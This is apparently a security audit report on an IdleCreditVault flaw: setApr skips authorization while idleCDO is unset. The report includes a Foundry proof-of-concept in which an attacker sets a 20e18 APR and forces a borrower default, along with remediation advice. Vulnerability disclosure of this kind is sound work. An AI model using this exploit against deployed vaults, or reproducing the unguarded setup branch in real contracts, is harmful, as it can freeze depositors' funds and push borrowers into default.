### Title
Unauthenticated APR configuration before `idleCDO` wiring can force borrower default - ([File: contracts/strategies/idle/IdleCreditVault.sol](contracts/strategies/idle/IdleCreditVault.sol))

### Summary
`IdleCreditVault.setApr` disables its caller check whenever `idleCDO == address(0)`, allowing any EOA to change `lastApr` between strategy initialization and `setWhitelistedCDO`. [1](#0-0) 

### Finding Description
The credit-vault strategy is initialized before it is bound to its CDO, while `idleCDO` remains zero. [2](#0-1) 

During that setup window, an attacker can call `setApr` or `setAprs` without being the owner, manager, or CDO because authorization is skipped entirely when `_cdo == address(0)`. [3](#0-2) 

After the owner later calls `setWhitelistedCDO`, the attacker-controlled APR remains active unless the operator explicitly resets it. [1](#0-0) 

In the initial buffer phase, users deposit under the attacker-selected rate; after the honest owner or manager calls `startEpoch`, that stale rate determines `expectedEpochInterest` for the running epoch. [4](#0-3) 

Setting the value to the default maximum of `20e18` can inflate the borrower repayment obligation without authorization, while setting it to zero can suppress contractually owed yield. [5](#0-4) 

The factory deployment path calls `setAprs` and `setWhitelistedCDO` atomically, but manually deployed or upgraded vaults expose a real multi-transaction configuration window. [6](#0-5) 

### Impact Explanation
An attacker can permanently poison the credit-vault rate before the first epoch.

If the attacker selects the maximum scaled APR, the running epoch calculates an inflated `expectedEpochInterest`; when the borrower cannot satisfy that inflated transfer, `stopEpoch` enters `_handleBorrowerDefault`, marks the vault defaulted, pauses it, and disables withdrawal requests. [7](#0-6) 

For example, if the intended scaled APR is `10e18`, the attacker can set `20e18`, creating an unauthorized incremental liability of `NAV * 10e18 * epochDuration / 365 days`; any borrower funding shortfall in that amount triggers the default path. [1](#0-0) 

Defaulting makes the loss permanent for normal epoch operation because `startEpoch`, deposit restoration, and request flows are blocked once `defaulted` is set. [8](#0-7) 

### Likelihood Explanation
Exploitation requires only an unprivileged transaction between strategy initialization and `setWhitelistedCDO`.

No privileged caller, malicious borrower, malformed third-party data, or economic prerequisite is required; the only mitigating factors are atomic factory deployment or an operator manually correcting the APR before the first `startEpoch`. [9](#0-8) 

The default `maxApr` cap limits the inflated rate but does not authenticate the setup call, so an attacker can still set an unauthorized value up to `20e18`. [5](#0-4) 

### Recommendation
Remove the unauthenticated setup branch from `setApr`.

Require `msg.sender == owner()` while `idleCDO == address(0)`, and then require `msg.sender == idleCDO || msg.sender == manager` after wiring. [1](#0-0) 

Prefer configuring the CDO address atomically during initialization or storing a one-time `aprConfigured` flag so late front-running cannot alter the intended rate.

### Proof of Concept
```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.10;

import "forge-std/Test.sol";
import {TransparentUpgradeableProxy} from
  "@openzeppelin/contracts/proxy/transparent/TransparentUpgradeableProxy.sol";
import {IERC20Detailed} from "../contracts/interfaces/IERC20Detailed.sol";
import {IdleCreditVault} from "../contracts/strategies/idle/IdleCreditVault.sol";
import {IdleCDOEpochVariant} from "../contracts/IdleCDOEpochVariant.sol";

contract UnauthorizedSetupAprPoC is Test {
  address constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;

  IdleCreditVault strategy;
  IdleCDOEpochVariant cdo;
  address owner = makeAddr("owner");
  address manager = makeAddr("manager");
  address borrower = makeAddr("borrower");
  address attacker = makeAddr("attacker");
  address victim = makeAddr("victim");

  function test_AttackerSetsAprBeforeCdoWiring() public {
    vm.createSelectFork("mainnet");

    IdleCreditVault strategyImpl = new IdleCreditVault();
    strategy = IdleCreditVault(address(new TransparentUpgradeableProxy(
      address(strategyImpl),
      makeAddr("proxyAdmin"),
      abi.encodeWithSelector(
        IdleCreditVault.initialize.selector,
        USDC,
        owner,
        manager,
        borrower,
        "borrower",
        10e18
      )
    )));

    IdleCDOEpochVariant cdoImpl = new IdleCDOEpochVariant();
    cdo = IdleCDOEpochVariant(address(new TransparentUpgradeableProxy(
      address(cdoImpl),
      makeAddr("proxyAdmin"),
      abi.encodeWithSelector(
        IdleCDOEpochVariant.initialize.selector,
        0,
        USDC,
        owner,
        owner,
        address(0),
        address(strategy),
        100_000
      )
    )));

    // Attack: strategy is initialized, but idleCDO has not been wired yet.
    vm.prank(attacker);
    strategy.setApr(20e18);

    // Honest owner completes the previously intended setup without resetting APR.
    vm.prank(owner);
    strategy.setWhitelistedCDO(address(cdo));

    vm.startPrank(owner);
    cdo.setIsAYSActive(false);
    cdo.setFeeParams(makeAddr("feeReceiver"), 0, 100_000, 0);
    cdo.setEpochParams(30 days, 5 days);
    cdo.setKeyringParams(address(0), 0);
    vm.stopPrank();

    assertEq(strategy.getApr(), 20e18, "attacker APR persisted");

    uint256 principal = 1_000_000e6;
    deal(USDC, victim, principal);
    vm.startPrank(victim);
    IERC20Detailed(USDC).approve(address(cdo), principal);
    cdo.depositAA(principal);
    vm.stopPrank();

    vm.warp(block.timestamp + cdo.bufferPeriod());
    vm.prank(owner);
    cdo.startEpoch();

    assertTrue(cdo.isEpochRunning(), "epoch started");
    assertEq(
      cdo.expectedEpochInterest(),
      principal * 20e18 / 100 / 365 days * (30 days + 5 days),
      "borrower obligation uses attacker-selected APR"
    );

    // Fund the borrower for the intended 10% obligation, but not the malicious
    // 20% obligation. The ordinary stopEpoch call therefore enters default.
    uint256 intendedInterest =
      principal * 10e18 / 100 / 365 days * (30 days + 5 days);
    deal(USDC, borrower, intendedInterest);
    vm.prank(borrower);
    IERC20Detailed(USDC).approve(address(cdo), intendedInterest);

    vm.warp(cdo.epochEndDate() + 1);
    vm.prank(manager);
    cdo.stopEpoch(0, 0);

    assertTrue(cdo.defaulted(), "attacker configuration forced default");
    assertTrue(cdo.paused(), "deposits remain disabled");
  }
}
```

### Citations

**File:** contracts/strategies/idle/IdleCreditVault.sol (L88-90)
```text
  /// @notice default maximum allowed scaled apr
  uint256 public constant DEFAULT_MAX_APR = 20e18;
  /// @notice maximum allowed scaled apr, 0 disables the cap
```

**File:** contracts/strategies/idle/IdleCreditVault.sol (L124-147)
```text
  function initialize(
    address _underlyingToken,
    address _owner,
    address _manager,
    address _borrower,
    string memory borrowerName,
    uint256 _apr
  ) public virtual initializer {
    OwnableUpgradeable.__Ownable_init();
    ReentrancyGuardUpgradeable.__ReentrancyGuard_init();
    require(token == address(0), "Token is already initialized");

    //----- // -------//
    token = _underlyingToken;
    underlyingToken = IERC20Detailed(token);
    tokenDecimals = underlyingToken.decimals();
    oneToken = 10**(tokenDecimals);
    borrower = _borrower;
    manager = _manager;
    maxApr = DEFAULT_MAX_APR;
    // on the first setup we set the lastApr equal to the unscaledApr
    lastApr = _apr;
    unscaledApr = _apr;
    defaultRecoveryInitialized = true;
```

**File:** contracts/strategies/idle/IdleCreditVault.sol (L202-235)
```text
  /// @notice set both the scaled and unscaled apr
  /// @dev only cdo and manager can set the apr.
  /// @param _unscaledApr unscaled apr
  /// @param _apr scaled apr
  function setAprs(uint256 _unscaledApr, uint256 _apr) external {
    unscaledApr = _unscaledApr;
    // here we also check that msg.sender is allowed
    setApr(_apr);
  }

  /// @notice set both the unscaled APR and APR scaled by epoch plus buffer duration.
  /// @dev only CDO and manager can set the APR through `setApr`.
  /// @param _unscaledApr unscaled APR
  /// @param _duration epoch duration
  /// @param _buffer buffer duration
  function setAprsWithBuffer(uint256 _unscaledApr, uint256 _duration, uint256 _buffer) external {
    unscaledApr = _unscaledApr;
    setApr(_duration == 0 ? _unscaledApr : _unscaledApr * (_duration + _buffer) / _duration);
  }

  /// @notice set the fixed apr
  /// @dev only cdo and manager can set the apr. If manager manually set apr from 
  /// here it will not be scaled to include the buffer period
  function setApr(uint256 _apr) public {
    address _cdo = idleCDO;

    // if cdo is not yet set we skip the check (this can happen only during the setup)
    if (_cdo != address(0)) {
      if (msg.sender != _cdo && msg.sender != manager) revert NotAllowed();
    }
    uint256 _maxApr = maxApr;
    if (_maxApr != 0 && _apr > _maxApr) revert NotAllowed();
    lastApr = _apr;
  }
```

**File:** contracts/IdleCDOEpochVariant.sol (L233-262)
```text
  function startEpoch() external {
    _checkOnlyOwnerOrManager();

    // Check that buffer period passed (and epoch is not running as epochEndDate is set)
    // and that the pool is not closed (ie epochDuration == 0)
    uint256 _epochDuration = epochDuration; 
    _checkNotAllowed(defaulted || block.timestamp < (epochEndDate + bufferPeriod) || _epochDuration == 0);
    _checkProgrammableBorrowerMode();
    // Remove raw donated underlyings before calculating epoch interest or borrower transfer amounts.
    _skimDonatedAssets();

    isEpochRunning = true;
    // prevent deposits
    _pause();

    // prevent withdrawals requests
    allowAAWithdrawRequest = false;
    allowBBWithdrawRequest = false;

    IdleCreditVault _strategy = IdleCreditVault(strategy);

    // calculate expected interest 
    // NOTE: all withdrawal requests, burn tranche tokens and decrease getContractValue,
    // this can be done only prior to the start of the epoch so getContractValue() is the total amount net
    // of all withdrawal requests. We add the fee that we should get for normal pending withdraws
    // we also add/remove the over/under performance caused by withdraw requests.
    // Pending fees remain due even if fixed-APR requests exhaust active interest.
    int256 adjustedActiveInterest = int256(_calcInterest(getContractValue())) + interestForOverUnderPerformance;
    if (adjustedActiveInterest < 0) adjustedActiveInterest = 0;
    expectedEpochInterest = pendingWithdrawFees + uint256(adjustedActiveInterest);
```

**File:** contracts/IdleCDOEpochVariant.sol (L408-420)
```text
    try this.getFundsFromBorrower(_amountToPullFromBorrower + _pendingWithdraws) {
      // transfer in strategy and decrease pendingWithdraws
        _strategy.collectWithdrawFunds(_pendingWithdraws);
      // Only settle borrower interest when CDO is fronting it (minted mode, not closing pool).
      // When requesting all funds (_interest == 1) the CDO pulls cash directly, no fronting.
      if (_mintInterest && isProgrammableBorrower) {
        IProgrammableBorrower(_borrower()).settleBorrowerInterest();
      }
      // Split pending withdraw fees before update accounting
      // NOTE: Fees are sent with 2 different transfer calls, here and after updateAccounting, to avoid complicated calculations
      if (!_mintInterest) {
        _transferFeeUnderlyings(_pendingWithdrawFees);
      }
```

**File:** contracts/IdleCDOEpochVariant.sol (L576-599)
```text
  /// @notice Handle borrower default
  function _handleBorrowerDefault(uint256 funds) internal {
    defaulted = true;
    // Do not reopen instant claims here. They remain disabled when funding is pending;
    // successful full funding is the only path that enables them before finalization.

    if (isProgrammableBorrower) {
      IProgrammableBorrower(_borrower()).onDefault();
    }

    // deposits should be already prevented
    if (!paused()) {
      _pause();
    }

    // stop the current epoch
    isEpochRunning = false;

    // prevent withdrawals requests
    allowAAWithdrawRequest = false;
    allowBBWithdrawRequest = false;

    emit BorrowerDefault(funds);
  }
```

**File:** contracts/IdleCreditVaultFactory.sol (L288-307)
```text
  function _configureCreditVault(
    IdleCDOEpochVariant cv,
    IdleCreditVault strategy,
    CreditVaultParams memory par,
    address keyringWhitelist,
    address manager
  ) internal {
    cv.setEpochParams(par.epochDuration, par.bufferPeriod);
    cv.setInstantWithdrawParams(par.instantWithdrawDelay, par.instantWithdrawAprDelta, par.disableInstantWithdraw);
    cv.setKeyringParams(keyringWhitelist, par.keyringPolicy);
    if (par.isInterestMinted) {
      cv.setIsInterestMinted(par.isInterestMinted);
    }
    cv.setIsDepositDuringEpochDisabled(par.isDepositDuringEpochDisabled);
    cv.setFeeParams(par.feeReceiver, par.fees, feeSplit, par.managementFee);
    cv.setGuardian(manager);
    // setAprs should be done before setWhitelistedCDO
    strategy.setAprs(par.apr, par.apr * (par.epochDuration + par.bufferPeriod) / par.epochDuration);
    strategy.setWhitelistedCDO(address(cv));
  }
```
